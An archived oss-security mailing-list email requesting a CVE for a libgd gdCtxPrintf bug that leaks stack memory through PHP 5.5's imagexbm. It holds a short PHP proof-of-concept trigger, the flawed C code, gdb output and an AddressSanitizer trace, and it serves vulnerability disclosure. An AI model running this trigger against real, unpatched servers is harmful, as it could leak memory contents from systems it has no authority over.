X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2616" "Sunday" "29" "May" "2016" "12:43:34" "-0500" "=?UTF-8?B?RmVybmFuZG8gTXXDsW96?=" "fernando@null-life.com" "<CAEr-gPHkGeMp-k75G5X3MNutXvNx9Q35uYtYrKcdGsH_0wUKQQ@mail.gmail.com>" "81" "[oss-security] CVE Request: libgd - gdCtxPrintf memory leak" nil nil nil "5" "2016052917:43:34" "[oss-security] CVE Request: libgd - gdCtxPrintf memory leak" (number mark "U       fernando@nul May 29   81/2616  " thread-indent "\"[oss-security] CVE Request: libgd - gdCtxPrintf memory leak\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26343 invoked by uid 550); 29 May 2016 17:43:47 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26314 invoked from network); 29 May 2016 17:43:46 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=null-life-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:date:message-id:subject:from:to
         :content-transfer-encoding;
        bh=fCiLe52isz9G0Te6/fEt00zvJw046mH8Q9BM4bLiH94=;
        b=Idau3K9j9SS7ZGvOfYHqaqyKDfeD6E+1VwGZ12INfIbL8uD/02j/R2bo2Vt0/l7W79
         wfz8deqEGJyIfNggRxnCul8nzIPY5hrwfuIaI9cE7T5EQ0T+yyPLlIMvd2GsOFaHeSTI
         dRYfvmfyrQoI1/sEeseAWUr+aGPCIHJnyaN6rlbuS3LJghzC7gH+F3uJu2f/BC7Vg5YX
         aPeT7V08zD1EL3XXtcfmKg3zFMdGIT9qzBGF7gIQ7PUphzK3lOlOixwZbuA36yGWuxq7
         yjfpqMNnpg6Zby1rcWpoMnDnpQ3OHkQwUuILWID30UhsWuELdFJCMSWSkUCg5xkGlIeX
         a+fA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-transfer-encoding;
        bh=fCiLe52isz9G0Te6/fEt00zvJw046mH8Q9BM4bLiH94=;
        b=Mouk18wln2gZyku/9kRqzNtXgCXaq4j7HhTKNszBAjijpVg7QQvJg2YCDkKkNjgNBp
         s+AHbWsEI51i6SRpJMd5JnvMOTfvIFLl/CY7UIRA9Ol3WH2ivw6ICBeZ/1oQDwPBseMS
         8m1Sk9TnVN1morGCateZ5Jdi6VbKizThfI/koeEfDKwL4HRd0BGr8l298GJqYVImGE71
         QceWAYPMRa9qmqjk77BRl6diinDfxYH4TNgyVZNimalV7DU/U8Pw/OMol7uRXfJgXx6Q
         iTJCeLnsFE7XZYo+51uCcDr2a+U+wn7eHcKV2Qa0IMyaV+rrd+V6kFizzOHDBHYm9DcC
         ogIQ==
X-Gm-Message-State: ALyK8tLRbSvXoso0Sd9r9wVwti4OzEQV6ZQtbZZBlu4DJRWDeLy1zgPcZ4Z8r1GBcvVXK7RzhtQdBQqPoz/4vw==
MIME-Version: 1.0
X-Received: by 10.176.5.194 with SMTP id e60mr12903163uae.37.1464543814226;
 Sun, 29 May 2016 10:43:34 -0700 (PDT)
X-Originating-IP: [190.24.57.39]
Date: Sun, 29 May 2016 12:43:34 -0500
Message-ID: <CAEr-gPHkGeMp-k75G5X3MNutXvNx9Q35uYtYrKcdGsH_0wUKQQ@mail.gmail.com>
From: =?UTF-8?Q?Fernando_Mu=C3=B1oz?= <fernando@null-life.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] CVE Request: libgd - gdCtxPrintf memory leak

libgd report:
https://github.com/libgd/libgd/issues/211

PHP report:
https://bugs.php.net/bug.php?id=3D72115 - password 18c90f75

Fix:
https://github.com/libgd/libgd/commit/4dc1a2d7931017d3625f2d7cff70a17ce58b5=
3b4

Credit: Fernando Mu=C3=B1oz and Marcelo Echeverria

While creating an XBM image (imagexbm) with an user supplied name,
libgd isn't checking the vsnprintf return value and PHP 5.5 will trust
this length and read more memory than it should, causing a read-out-of
boundaries, leaking stack memory.

vsnprintf man: "a return value of size or more means that the output
was truncated".

PHP devs marked it as a "not a bug" because the bundled version of
libgd with PHP 5.5 is not vulnerable, however using PHP with
systemwide libgd is a common practice. PHP 5.6 and PHP 7 are not
vulnerable to this issue because another bugfix prevents this from
being exploited [1].

Test script (PHP 5.5 and systemwide libgd):
<?php
$var1=3Dimagecreatetruecolor ( 2 , 2);
$var2=3Dstr_repeat("ABCD", 1030);
imagexbm($var1, $var2, 0);


Affected code:
/* {{{ gdCtxPrintf */
static void gdCtxPrintf(gdIOCtx * out, const char *format, ...)
{
    char buf[4096];
    int len;
    va_list args;

    va_start(args, format);
    len =3D vsnprintf(buf, sizeof(buf)-1, format, args);
     // -----> if len > 4096 data was truncated
     // -----> but libgd returns this value as is
    va_end(args);
    out->putBuf(out, buf, len);
}


Debug:
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/php/php-55/sapi/cli/php -n
-dextension=3D/home/user/php/php-55/modules/gd.so /home/user/img.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".

Breakpoint 1, _php_image_output_putbuf (ctx=3D0xb46ddf38,
buf=3D0xbfffa69c, l=3D8017) at /home/user/php/php-55/ext/gd/gd_ctx.c:39
39              return php_write((void *)buf, l TSRMLS_CC);
(gdb) print l
$7 =3D 8017

PHP will use 8017 as string length.

ASAN:
#define ABCD... <random stuff from memory> ...
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
ERROR: AddressSanitizer: stack-buffer-underflow on address
0xbfffb750 at pc 0xb7aa6dbd bp 0xbfffa408 sp 0xbfff9fdc
READ of size 8017 at 0xbfffb750 thread T0
                                       #0 0xb7aa6dbc
(/usr/lib/i386-linux-gnu/libasan.so.2+0x3ddbc)
    #1 0x99388cf in sapi_cli_single_write
/home/user/php/php-55/sapi/cli/php_cli.c:273


[1] https://bugs.php.net/bug.php?id=3D66339
